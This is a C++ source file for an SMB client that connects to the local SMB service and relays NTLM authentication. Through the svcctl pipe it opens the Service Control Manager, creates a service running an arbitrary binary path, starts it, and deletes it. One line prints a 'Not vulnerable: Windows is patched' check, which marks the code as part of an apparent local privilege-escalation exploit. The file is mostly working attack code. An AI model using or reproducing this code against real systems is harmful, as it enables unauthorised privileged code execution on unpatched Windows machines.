#include "stdafx.h"


SmbConnection::SmbConnection()
{
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	_sockConnect = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	_mid = 1;
	RtlZeroMemory(_svc_handle, sizeof(_svc_handle));
}

SmbConnection::~SmbConnection()
{
	closesocket(_sockConnect);
	WSACleanup();
}

void SmbConnection::DoConnect()
{
	sockaddr_in infoSocket;
	infoSocket.sin_family = AF_INET;
	infoSocket.sin_addr.s_addr = inet_addr("127.0.0.1");
	infoSocket.sin_port = htons(445);

	int res = connect(_sockConnect, (SOCKADDR *)&infoSocket, sizeof(infoSocket));
	if (res == SOCKET_ERROR)
		printf("Failed to connect to SMB interface. Error Code: %ld\n", WSAGetLastError());
}

void SmbConnection::ForgeSmbHeader(char* buffer, UCHAR command) {
	SMB_Header smb_hdr;

	memcpy(smb_hdr.Protocol, "\xff\x53\x4d\x42", 4);
	smb_hdr.Command = command;
	smb_hdr.Status = STATUS_SUCCESS;
	smb_hdr.Flags = SMB_FLAGS_CANONICALIZED_PATHS | SMB_FLAGS_CASE_INSENSITIVE;
	smb_hdr.Flags2 = 0xc803;

	int pid = _getpid();
	smb_hdr.PIDHigh = pid >> 16;
	smb_hdr.PIDLow = pid;
	(_mid >= 5) ? smb_hdr.TID = 2048 : smb_hdr.TID = 0; // Tree ID is set with 5th msg
	(_mid >= 3) ? smb_hdr.UID = 2048 : smb_hdr.UID = 0; // UID is set with type3 msg
	smb_hdr.MID = _mid++;

	memcpy(buffer, &smb_hdr.Protocol, 4);
	memcpy(&buffer[4], &smb_hdr.Command, 1);
	memcpy(&buffer[5], &smb_hdr.Status, 4);
	memcpy(&buffer[9], &smb_hdr.Flags, 1);
	memcpy(&buffer[10], &smb_hdr.Flags2, 2);
	memcpy(&buffer[12], &smb_hdr.PIDHigh, 2);
	memcpy(&buffer[24], &smb_hdr.TID, 2);
	memcpy(&buffer[26], &smb_hdr.PIDLow, 2);
	memcpy(&buffer[28], &smb_hdr.UID, 2);
	memcpy(&buffer[30], &smb_hdr.MID, 2);
}


void SmbConnection::SendAndReceivePacket(char* buffer, int length, char* packet_name)
{
	int i = send(_sockConnect, buffer, length, 0);
	if (i <= 0) { printf("SMB request failed (%d bytes) [%d]", i, WSAGetLastError()); exit(1); }

	i = recv(_sockConnect, buffer, 4096, 0);
}


void SmbConnection::NegotiateExchange()
{
	char buffer[4096] = { 0 };

	ForgeSmbHeader(buffer, SMB_COM_NEGOTIATE); // Header is 32 bytes long.
	memset(&buffer[32], 0, 1); // wordCount

	char* dialect = "\x02NT LM 0.12";	// Negociate data
	short byteCount = strlen(dialect) + 1;
	memcpy(&buffer[33], &byteCount, 2);
	memcpy(&buffer[35], dialect, byteCount);

	char packet_buf[4096] = { 0 };
	short packet_len = 35 + byteCount; // header(32) + wordcount(1) + bytecount(2) + bytes(bytecount)
	memset(&packet_buf[2], packet_len >> 8, 1);	// FIXME: normally packet_len should be on 3 bytes
	memset(&packet_buf[3], packet_len, 1);			// Here it is only on 2 bytes (short)
	memcpy(&packet_buf[4], buffer, packet_len);
	
	SendAndReceivePacket(packet_buf, packet_len + 4, "Negociate");
}


int SmbConnection::SessionSetupExchange(char* ntlmssp_buff, int ntlmssp_len, char* ntlmssp_resp)
{
	char buffer[4096] = { 0 };

	ForgeSmbHeader(buffer, SMB_COM_SESSION_SETUP_ANDX); // Header is 32 bytes long.

	UCHAR wordCount = 0x0C; // this part is ugly and hardcoded, close your eyes or it will hurt
	memset(&buffer[32], wordCount, 1);	// wordCount
	memset(&buffer[33], 0xFF, 1);		// no further command
	memset(&buffer[34], 0, 1);			// reserved
	memset(&buffer[35], 0xDEDE, 2);		// AndXOffset
	USHORT max_buff = 0x1104;
	memcpy(&buffer[37], &max_buff, 2);	// Max Buffer (0x0411)
	memset(&buffer[39], 0x0A, 1);		// Max Mpx Count (0x0A00)
	memset(&buffer[41], 0x01, 1);		// VC Number	(0x0100)
	memset(&buffer[43], 0, 4);			// Session key
	memcpy(&buffer[47], &ntlmssp_len, 2);// Security Blob length => length of NTLMSSP buffer
	memset(&buffer[49], 0, 4);			// Reserved
	UINT capabilities = 0x80000054;
	memcpy(&buffer[53], &capabilities, 4);	// Capabilities (0x54000080)

	USHORT byteCount = ntlmssp_len + 24 + 12;
	memcpy(&buffer[57], &byteCount, 2);
	memcpy(&buffer[59], ntlmssp_buff, ntlmssp_len);

	char packet_buf[4096] = { 0 };
	USHORT packet_len = 35 + wordCount * 2 + byteCount; // header(32) + wordcount(1) + bytecount(2) + words(wordcount*2) + bytes(bytecount)
	memset(&packet_buf[2], packet_len >> 8, 1);		// FIXME: normally packet_len should be on 3 bytes
	memset(&packet_buf[3], packet_len, 1);			// Here it is only on 2 bytes (short)
	memcpy(&packet_buf[4], buffer, packet_len);
	WCHAR* tmp = L"Windows 8.1";
	memcpy(&packet_buf[packet_len + 4 - 36], tmp, 24); // OS Name
	tmp = L"cCIFS";
	memcpy(&packet_buf[packet_len + 4 - 12], tmp, 12); // LAN Manager

	SendAndReceivePacket(packet_buf, packet_len + 4, "SessionSetupAndX");
	int nt_status = 0;
	memcpy(&nt_status, &packet_buf[4 + 5], 4);
	if (nt_status == 0xC0000022) { printf("Not vulnerable: Windows is patched\n");  exit(1); }

	wordCount = packet_buf[4 + 32];												// we reuse byteCount for blob_length
	memcpy(&byteCount, &packet_buf[4 + 32 + 1 + 2 * wordCount - 2], 2);			// blob length is located at words[wordCount - blob_len(2)]
	memcpy(ntlmssp_resp, &packet_buf[4 + 32 + 1 + 2 * wordCount + 2], byteCount); // security blob is after words[wordCount] + byteCount
	return byteCount;
}

void SmbConnection::TreeConnectExchange()
{
	char buffer[4096] = { 0 };

	ForgeSmbHeader(&buffer[4], SMB_COM_TREE_CONNECT_ANDX); // Header is 32 bytes long.

	UCHAR wordCount = 4; // this part is ugly and hardcoded, close your eyes or it will hurt
	memset(&buffer[4 + 32], wordCount, 1);	// wordCount
	memset(&buffer[4 + 33], 0xFF, 1);		// no further command
	memset(&buffer[4 + 34], 0, 1);			// reserved
	memset(&buffer[4 + 35], 0xDEDE, 2);		// AndXOffset
	memset(&buffer[4 + 37], 0x0000, 2);		// Flags
	USHORT pwdLength = 1;
	memcpy(&buffer[4 + 39], &pwdLength, 2);		// Password length

	USHORT byteCount = 41;
	memcpy(&buffer[4 + 41], &byteCount, 2); // bytecount
	memset(&buffer[4 + 43], 0x00, 1);		// Password
	wchar_t* path = L"\\\\127.0.0.1\\IPC$\0";
	memcpy(&buffer[4 + 44], path, (wcslen(path) + 1) * 2);
	char* service = "?????\0";
	memcpy(&buffer[4 + 44 + (wcslen(path) + 1) * 2], service, strlen(service) + 1);
	
	USHORT packet_len = 35 + wordCount * 2 + byteCount;
	memset(&buffer[2], packet_len >> 8, 1);		// FIXME: normally packet_len should be on 3 bytes
	memset(&buffer[3], packet_len, 1);			// Here it is only on 2 bytes (short)

	SendAndReceivePacket(buffer, packet_len + 4, "TreeConnect");
}

void SmbConnection::NTCreateExchange()
{
	char buffer[4096] = { 0 };

	ForgeSmbHeader(&buffer[4], SMB_COM_NT_CREATE_ANDX); // Header is 32 bytes long.
	WCHAR* filename = L"\\svcctl\0";
	USHORT fname_length = 2 * wcslen(filename);

	UCHAR wordCount = 24; // this part is ugly and hardcoded, close your eyes or it will hurt
	memset(&buffer[4 + 32], wordCount, 1);	// wordCount
	memset(&buffer[4 + 33], 0xFF, 1);		// no further command
	memset(&buffer[4 + 34], 0, 1);			// reserved
	memset(&buffer[4 + 35], 0xDEDE, 2);		// AndXOffset
	memset(&buffer[4 + 37], 0x00, 1);		// reserved
	memcpy(&buffer[4 + 38],	&fname_length, 2);		// filename
	int flags = 0x00000016;
	memcpy(&buffer[4 + 40], &flags, 4);		// create flags

	memset(&buffer[4 + 44], 0x00, 4);		// root id
	int mask = 0x0002019F;
	memcpy(&buffer[4 + 48], &mask, 4);		// access mask

	memset(&buffer[4 + 52], 0x00, 8);		// alloc size
	int attributes = 0x00000080;
	memcpy(&buffer[4 + 60], &attributes, 4);	// file attributes
	int access = 0x00000007;
	memcpy(&buffer[4 + 64], &access, 4);		// share access

	int disposition = 0x00000001;
	memcpy(&buffer[4 + 68], &disposition, 4);		// disposition
	int options = 0x00000040;
	memcpy(&buffer[4 + 72], &options, 4);		// create options
	int impersonation = 0x00000002;
	memcpy(&buffer[4 + 76], &impersonation, 4);		// impersonation
	memset(&buffer[4 + 80], 0x03, 1);		// security flags

	USHORT byteCount = 1 + fname_length + 2;
	memcpy(&buffer[4 + 81], &byteCount, 2);		// filename
	memset(&buffer[4 + 83], 0x00, 1);		// padding ?
	memcpy(&buffer[4 + 84], filename, fname_length + 2);	// filename

	USHORT packet_len = 35 + wordCount * 2 + byteCount;
	memset(&buffer[2], packet_len >> 8, 1);		// FIXME: normally packet_len should be on 3 bytes
	memset(&buffer[3], packet_len, 1);			// Here it is only on 2 bytes (short)

	SendAndReceivePacket(buffer, packet_len + 4, "NTCreate");
}


void SmbConnection::TransDCERPC()
{
	char buffer[4096] = { 0 };

	ForgeSmbHeader(&buffer[4], SMB_COM_TRANS_DCERPC); // Header is 32 bytes long.

	UCHAR wordCount = 16; // this part is ugly and hardcoded, close your eyes or it will hurt
	memset(&buffer[4 + 32], wordCount, 1);	// wordCount
	USHORT datacount = 72;
	memcpy(&buffer[4 + 35], &datacount, 2);	// data count
	USHORT maxdatacount = 1024;
	memcpy(&buffer[4 + 39], &maxdatacount, 2);	// max data count

	USHORT parameterOffset = 82;
	memcpy(&buffer[4 + 53], &parameterOffset, 2);	// max data count
	memcpy(&buffer[4 + 55], &datacount, 2);	// data count
	memcpy(&buffer[4 + 57], &parameterOffset, 2);	// offset
	memset(&buffer[4 + 59], 0x02, 1);		// setup count

	int smb_pipe = 0x40000026;
	memcpy(&buffer[4 + 61], &smb_pipe, 4);		// smbpipe hdr

	USHORT byteCount = 87;
	memcpy(&buffer[4 + 65], &byteCount, 2);		// bytecount
	WCHAR* trans_name = L"\\PIPE\\\0";
	USHORT trans_length = 2 * wcslen(trans_name) + 2;
	memcpy(&buffer[4 + 68], trans_name, trans_length);		// transac name

	
	/***  Begin DCE/RPC part  ***/
	int inx = 4 + 68 + trans_length;
	memset(&buffer[inx], 0x05, 1); // major version
	memset(&buffer[inx + 1], 0x00, 1); // minor version
	memset(&buffer[inx + 2], 0x0B, 1); // packet type
	memset(&buffer[inx + 3], 0x03, 1); // packet flags
	int representation = 0x00000010;
	memcpy(&buffer[inx + 4], &representation, 4); // represent
	memcpy(&buffer[inx + 8], &datacount, 2);	// frag length

	int callid = 1;
	memcpy(&buffer[inx + 12], &callid, 4);	// call id
	USHORT maxfrag = 4280;
	memcpy(&buffer[inx + 16], &maxfrag, 2);	// max xmit frag
	memcpy(&buffer[inx + 18], &maxfrag, 2);	// max xmit frag
	memset(&buffer[inx + 24], 0x01, 1); // num ctx item

	/* ------------------- */
	memset(&buffer[inx + 30], 0x01, 1); // num trans item

	GUID myguid = { 0x367abb81, 0x9844, 0x35f1, 
	{ 0xad, 0x32, 0x98, 0xF0, 0x38, 0x00, 0x10, 0x03 } };
	memcpy(&buffer[inx + 32], &myguid, sizeof(GUID));	// 
	USHORT int_version = 2;
	memcpy(&buffer[inx + 32 + sizeof(GUID)], &int_version, 2);	// interface version

	GUID myguid2 = { 0x8a885d04, 0x1ceb, 0x11c9,
	{ 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60 } };
	memcpy(&buffer[inx + 36 + sizeof(GUID)], &myguid2, sizeof(GUID));	// 
	memcpy(&buffer[inx + 36 + 2 * sizeof(GUID)], &int_version, 2);	// interface version

	/***  End DCE/RPC part  ***/

	USHORT packet_len = 35 + wordCount * 2 + byteCount;
	memset(&buffer[2], packet_len >> 8, 1);		// FIXME: normally packet_len should be on 3 bytes
	memset(&buffer[3], packet_len, 1);			// Here it is only on 2 bytes (short)

	SendAndReceivePacket(buffer, packet_len + 4, "TransDCERPC");
}

void SmbConnection::OpenSCManagerW()
{
	char buffer[4096] = { 0 };

	ForgeSmbHeader(&buffer[4], SMB_COM_TRANS_DCERPC); // Header is 32 bytes long.

	UCHAR wordCount = 16; // this part is ugly and hardcoded, close your eyes or it will hurt
	memset(&buffer[4 + 32], wordCount, 1);	// wordCount
	USHORT datacount = 72;
	memcpy(&buffer[4 + 35], &datacount, 2);	// data count
	USHORT maxdatacount = 1024;
	memcpy(&buffer[4 + 39], &maxdatacount, 2);	// max data count

	USHORT parameterOffset = 82;
	memcpy(&buffer[4 + 53], &parameterOffset, 2);	// max data count
	memcpy(&buffer[4 + 55], &datacount, 2);	// data count
	memcpy(&buffer[4 + 57], &parameterOffset, 2);	// offset
	memset(&buffer[4 + 59], 0x02, 1);		// setup count

	int smb_pipe = 0x40000026;
	memcpy(&buffer[4 + 61], &smb_pipe, 4);		// smbpipe hdr

	USHORT byteCount = 87;
	memcpy(&buffer[4 + 65], &byteCount, 2);		// bytecount
	WCHAR* trans_name = L"\\PIPE\\\0";
	USHORT trans_length = 2 * wcslen(trans_name) + 2;
	memcpy(&buffer[4 + 68], trans_name, trans_length);		// transac name


	/***  Begin DCE/RPC part  ***/
	int inx = 4 + 68 + trans_length;
	memset(&buffer[inx], 0x05, 1); // major version
	memset(&buffer[inx + 1], 0x00, 1); // minor version
	memset(&buffer[inx + 2], 0x00, 1); // packet type
	memset(&buffer[inx + 3], 0x03, 1); // packet flags
	int representation = 0x00000010;
	memcpy(&buffer[inx + 4], &representation, 4); // represent
	memcpy(&buffer[inx + 8], &datacount, 2);	// frag length

	int callid = 2;
	memcpy(&buffer[inx + 12], &callid, 4);	// call id
	UINT allochint = 56;
	memcpy(&buffer[inx + 16], &allochint, 4);	// alloc hint
	USHORT opnum = 15;
	memcpy(&buffer[inx + 22], &opnum, 2); // ctx id

	/* --------- Microsoft Service Control ---------- */
	int ref_id = 0x4c6ad99e;
	WCHAR* machine_name = L"\\\\127.0.0.1\0";
	int machine_length = wcslen(machine_name) + 1;

	memcpy(&buffer[inx + 24], &ref_id, 4);
	memcpy(&buffer[inx + 28], &machine_length, 4);
	memcpy(&buffer[inx + 36], &machine_length, 4);
	memcpy(&buffer[inx + 40], machine_name, 2 * machine_length); // machine name
	int mask = 0x000F003F;
	memcpy(&buffer[inx + 40 + 2 * machine_length + 4], &mask, 4);


	/***  End DCE/RPC part  ***/

	USHORT packet_len = 35 + wordCount * 2 + byteCount;
	memset(&buffer[2], packet_len >> 8, 1);		// FIXME: normally packet_len should be on 3 bytes
	memset(&buffer[3], packet_len, 1);			// Here it is only on 2 bytes (short)

	SendAndReceivePacket(buffer, packet_len + 4, "OpenSCManager");
	memcpy(_svc_handle, &buffer[4 + 80], sizeof(_svc_handle));

	int return_code = 0;
	memcpy(&return_code, &buffer[4 + 100], sizeof(return_code));
	if (return_code != STATUS_SUCCESS) { printf("Failed to open Service Manager: %d\n", return_code); exit(1); }
}

void SmbConnection::OpenServiceW()
{
	char buffer[4096] = { 0 };

	ForgeSmbHeader(&buffer[4], SMB_COM_TRANS_DCERPC); // Header is 32 bytes long.

	UCHAR wordCount = 16; // this part is ugly and hardcoded, close your eyes or it will hurt
	memset(&buffer[4 + 32], wordCount, 1);	// wordCount
	USHORT datacount = 92;
	memcpy(&buffer[4 + 35], &datacount, 2);	// data count
	USHORT maxdatacount = 1024;
	memcpy(&buffer[4 + 39], &maxdatacount, 2);	// max data count

	USHORT parameterOffset = 82;
	memcpy(&buffer[4 + 53], &parameterOffset, 2);	// max data count
	memcpy(&buffer[4 + 55], &datacount, 2);	// data count
	memcpy(&buffer[4 + 57], &parameterOffset, 2);	// offset
	memset(&buffer[4 + 59], 0x02, 1);		// setup count

	int smb_pipe = 0x40000026;
	memcpy(&buffer[4 + 61], &smb_pipe, 4);		// smbpipe hdr

	USHORT byteCount = 107;
	memcpy(&buffer[4 + 65], &byteCount, 2);		// bytecount
	WCHAR* trans_name = L"\\PIPE\\\0";
	USHORT trans_length = 2 * wcslen(trans_name) + 2;
	memcpy(&buffer[4 + 68], trans_name, trans_length);		// transac name


	/***  Begin DCE/RPC part  ***/
	int inx = 4 + 68 + trans_length;
	memset(&buffer[inx], 0x05, 1); // major version
	memset(&buffer[inx + 1], 0x00, 1); // minor version
	memset(&buffer[inx + 2], 0x00, 1); // packet type
	memset(&buffer[inx + 3], 0x03, 1); // packet flags
	int representation = 0x00000010;
	memcpy(&buffer[inx + 4], &representation, 4); // represent
	memcpy(&buffer[inx + 8], &datacount, 2);	// frag length

	int callid = 3;
	memcpy(&buffer[inx + 12], &callid, 4);	// call id
	UINT allochint = 76;
	memcpy(&buffer[inx + 16], &allochint, 4);	// alloc hint
	USHORT opnum = 16;
	memcpy(&buffer[inx + 22], &opnum, 2); // ctx id

	/* --------- Microsoft Service Control ---------- */
	WCHAR* cmd = L"JWRShellService\0";
	int cmd_len = wcslen(cmd) + 1;

	memcpy(&buffer[inx + 24], _svc_handle, 20);
	memcpy(&buffer[inx + 44], &cmd_len, 4);
	memcpy(&buffer[inx + 52], &cmd_len, 4);
	memcpy(&buffer[inx + 56], cmd, 2 * cmd_len); // machine name
	int mask = 0x000F003F;
	memcpy(&buffer[inx + 56 + 2 *  cmd_len], &mask, 4);
	/***  End DCE/RPC part  ***/

	USHORT packet_len = 35 + wordCount * 2 + byteCount;
	memset(&buffer[2], packet_len >> 8, 1);		// FIXME: normally packet_len should be on 3 bytes
	memset(&buffer[3], packet_len, 1);			// Here it is only on 2 bytes (short)

	SendAndReceivePacket(buffer, packet_len + 4, "OpenService");
}


void SmbConnection::CreateServiceW(WCHAR* bin_path)
{
	char buffer[4096] = { 0 };

	ForgeSmbHeader(&buffer[4], SMB_COM_TRANS_DCERPC); // Header is 32 bytes long.
	int bin_len = wcslen(bin_path) + 1; // len = 59 => 118 bytes

	UCHAR wordCount = 16; // this part is ugly and hardcoded, close your eyes or it will hurt
	memset(&buffer[4 + 32], wordCount, 1);	// wordCount
	USHORT datacount = 162 + 2 * bin_len;
	memcpy(&buffer[4 + 35], &datacount, 2);	// data count
	USHORT maxdatacount = 1024;
	memcpy(&buffer[4 + 39], &maxdatacount, 2);	// max data count

	USHORT parameterOffset = 82;
	memcpy(&buffer[4 + 53], &parameterOffset, 2);	// max data count
	memcpy(&buffer[4 + 55], &datacount, 2);	// data count
	memcpy(&buffer[4 + 57], &parameterOffset, 2);	// offset
	memset(&buffer[4 + 59], 0x02, 1);		// setup count

	int smb_pipe = 0x40000026;
	memcpy(&buffer[4 + 61], &smb_pipe, 4);		// smbpipe hdr

	USHORT byteCount = 177 + 2 * bin_len;
	memcpy(&buffer[4 + 65], &byteCount, 2);		// bytecount

	WCHAR* trans_name = L"\\PIPE\\\0";
	USHORT trans_length = 2 * wcslen(trans_name) + 2;
	memcpy(&buffer[4 + 68], trans_name, trans_length);		// transac name


	/***  Begin DCE/RPC part  ***/
	int inx = 4 + 68 + trans_length;
	memset(&buffer[inx], 0x05, 1); // major version
	memset(&buffer[inx + 1], 0x00, 1); // minor version
	memset(&buffer[inx + 2], 0x00, 1); // packet type
	memset(&buffer[inx + 3], 0x03, 1); // packet flags
	int representation = 0x00000010;
	memcpy(&buffer[inx + 4], &representation, 4); // represent
	memcpy(&buffer[inx + 8], &datacount, 2);	// frag length

	int callid = 4;
	memcpy(&buffer[inx + 12], &callid, 4);	// call id
	UINT allochint = 146 + 2 * bin_len;
	memcpy(&buffer[inx + 16], &allochint, 4);	// alloc hint
	USHORT opnum = 12;
	memcpy(&buffer[inx + 22], &opnum, 2); // ctx id

	/* --------- Microsoft Service Control ---------- */
	memcpy(&buffer[inx + 24], _svc_handle, 20);

	WCHAR* svc_name = L"MyTSvc\0";
	int svc_name_len = wcslen(svc_name) + 1;
	memcpy(&buffer[inx + 44], &svc_name_len, 4);
	memcpy(&buffer[inx + 52], &svc_name_len, 4);
	memcpy(&buffer[inx + 56], svc_name, 2 * svc_name_len); // machine name
	
	int ref_id = 0x715C191E;
	inx = inx + 56 + 2 * svc_name_len + 2; // padding
	memcpy(&buffer[inx], &ref_id, 4);
	memcpy(&buffer[inx + 4], &svc_name_len, 4);
	memcpy(&buffer[inx + 12], &svc_name_len, 4);
	memcpy(&buffer[inx + 16], svc_name, 2 * svc_name_len); // machine name

	int mask = 0x000F003F;
	inx = inx + 16 + 2 * svc_name_len + 2;
	memcpy(&buffer[inx], &mask, 4);
	int svc_type = 0x00000010;
	memcpy(&buffer[inx + 4], &svc_type, 4);
	int svc_start_type = SERVICE_DEMAND_START;
	memcpy(&buffer[inx + 8], &svc_start_type, 4);
	int svc_err_ctrl = SERVICE_ERROR_NORMAL;
	memcpy(&buffer[inx + 12], &svc_err_ctrl, 4);

	memcpy(&buffer[inx + 16], &bin_len, 4);
	memcpy(&buffer[inx + 24], &bin_len, 4);
	memcpy(&buffer[inx + 28], bin_path, bin_len * 2);

	/***  End DCE/RPC part  ***/

	USHORT packet_len = 35 + wordCount * 2 + byteCount;
	memset(&buffer[2], packet_len >> 8, 1);		// FIXME: normally packet_len should be on 3 bytes
	memset(&buffer[3], packet_len, 1);			// Here it is only on 2 bytes (short)

	SendAndReceivePacket(buffer, packet_len + 4, "CreateService");
	memcpy(_svc_handle, &buffer[4 + 84], sizeof(_svc_handle));
}

void SmbConnection::StartServiceW()
{
	char buffer[4096] = { 0 };

	ForgeSmbHeader(&buffer[4], SMB_COM_TRANS_DCERPC); // Header is 32 bytes long.

	UCHAR wordCount = 16; // this part is ugly and hardcoded, close your eyes or it will hurt
	memset(&buffer[4 + 32], wordCount, 1);	// wordCount
	USHORT datacount = 56;
	memcpy(&buffer[4 + 35], &datacount, 2);	// data count
	USHORT maxdatacount = 1024;
	memcpy(&buffer[4 + 39], &maxdatacount, 2);	// max data count

	USHORT parameterOffset = 82;
	memcpy(&buffer[4 + 53], &parameterOffset, 2);	// max data count
	memcpy(&buffer[4 + 55], &datacount, 2);	// data count
	memcpy(&buffer[4 + 57], &parameterOffset, 2);	// offset
	memset(&buffer[4 + 59], 0x02, 1);		// setup count

	int smb_pipe = 0x40000026;
	memcpy(&buffer[4 + 61], &smb_pipe, 4);		// smbpipe hdr

	USHORT byteCount = 71;
	memcpy(&buffer[4 + 65], &byteCount, 2);		// bytecount
	WCHAR* trans_name = L"\\PIPE\\\0";
	USHORT trans_length = 2 * wcslen(trans_name) + 2;
	memcpy(&buffer[4 + 68], trans_name, trans_length);		// transac name


	/***  Begin DCE/RPC part  ***/
	int inx = 4 + 68 + trans_length;
	memset(&buffer[inx], 0x05, 1); // major version
	memset(&buffer[inx + 1], 0x00, 1); // minor version
	memset(&buffer[inx + 2], 0x00, 1); // packet type
	memset(&buffer[inx + 3], 0x03, 1); // packet flags
	int representation = 0x00000010;
	memcpy(&buffer[inx + 4], &representation, 4); // represent
	memcpy(&buffer[inx + 8], &datacount, 2);	// frag length

	int callid = 5;
	memcpy(&buffer[inx + 12], &callid, 4);	// call id
	UINT allochint = 40;
	memcpy(&buffer[inx + 16], &allochint, 4);	// alloc hint
	USHORT opnum = 19;
	memcpy(&buffer[inx + 22], &opnum, 2); // ctx id

	/* --------- Microsoft Service Control ---------- */
	memcpy(&buffer[inx + 24], _svc_handle, 20);
	WCHAR* argv = {};
	memcpy(&buffer[inx + 48], &argv, 4);	// 
	/***  End DCE/RPC part  ***/

	USHORT packet_len = 35 + wordCount * 2 + byteCount;
	memset(&buffer[2], packet_len >> 8, 1);		// FIXME: normally packet_len should be on 3 bytes
	memset(&buffer[3], packet_len, 1);			// Here it is only on 2 bytes (short)

	SendAndReceivePacket(buffer, packet_len + 4, "StartService");
}

void SmbConnection::DeleteService()
{
	char buffer[4096] = { 0 };

	ForgeSmbHeader(&buffer[4], SMB_COM_TRANS_DCERPC); // Header is 32 bytes long.

	UCHAR wordCount = 16; // this part is ugly and hardcoded, close your eyes or it will hurt
	memset(&buffer[4 + 32], wordCount, 1);	// wordCount
	USHORT datacount = 44;
	memcpy(&buffer[4 + 35], &datacount, 2);	// data count
	USHORT maxdatacount = 1024;
	memcpy(&buffer[4 + 39], &maxdatacount, 2);	// max data count

	USHORT parameterOffset = 82;
	memcpy(&buffer[4 + 53], &parameterOffset, 2);	// max data count
	memcpy(&buffer[4 + 55], &datacount, 2);	// data count
	memcpy(&buffer[4 + 57], &parameterOffset, 2);	// offset
	memset(&buffer[4 + 59], 0x02, 1);		// setup count

	int smb_pipe = 0x40000026;
	memcpy(&buffer[4 + 61], &smb_pipe, 4);		// smbpipe hdr

	USHORT byteCount = 71;
	memcpy(&buffer[4 + 65], &byteCount, 2);		// bytecount
	WCHAR* trans_name = L"\\PIPE\\\0";
	USHORT trans_length = 2 * wcslen(trans_name) + 2;
	memcpy(&buffer[4 + 68], trans_name, trans_length);		// transac name


	/***  Begin DCE/RPC part  ***/
	int inx = 4 + 68 + trans_length;
	memset(&buffer[inx], 0x05, 1); // major version
	memset(&buffer[inx + 1], 0x00, 1); // minor version
	memset(&buffer[inx + 2], 0x00, 1); // packet type
	memset(&buffer[inx + 3], 0x03, 1); // packet flags
	int representation = 0x00000010;
	memcpy(&buffer[inx + 4], &representation, 4); // represent
	memcpy(&buffer[inx + 8], &datacount, 2);	// frag length

	int callid = 6;
	memcpy(&buffer[inx + 12], &callid, 4);	// call id
	UINT allochint = 28;
	memcpy(&buffer[inx + 16], &allochint, 4);	// alloc hint
	USHORT opnum = 2;
	memcpy(&buffer[inx + 22], &opnum, 2); // ctx id

	/* --------- Microsoft Service Control ---------- */
	memcpy(&buffer[inx + 24], _svc_handle, 20);
	/***  End DCE/RPC part  ***/

	USHORT packet_len = 35 + wordCount * 2 + byteCount;
	memset(&buffer[2], packet_len >> 8, 1);		// FIXME: normally packet_len should be on 3 bytes
	memset(&buffer[3], packet_len, 1);			// Here it is only on 2 bytes (short)

	SendAndReceivePacket(buffer, packet_len + 4, "DeleteService");
}
